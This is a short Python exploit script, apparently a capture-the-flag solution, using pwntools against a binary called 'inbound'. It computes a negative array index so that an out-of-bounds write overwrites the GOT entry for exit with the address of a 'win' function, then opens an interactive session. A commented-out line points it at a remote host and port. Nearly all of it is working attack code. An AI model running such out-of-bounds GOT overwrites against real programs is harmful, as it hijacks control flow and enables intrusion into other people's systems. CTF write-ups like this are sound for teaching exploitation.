from pwn import *

elf = ELF('./inbound')
io = process(elf.path)
#io = remote('34.170.146.252', 51979)

slot = 0x404060
index = (slot - elf.got['exit']) // 4
index = -index
log.info('index: %d' % index)
io.sendlineafter(b'index: ', str(index))
io.sendlineafter(b'value: ', str(elf.sym['win']))

io.interactive()
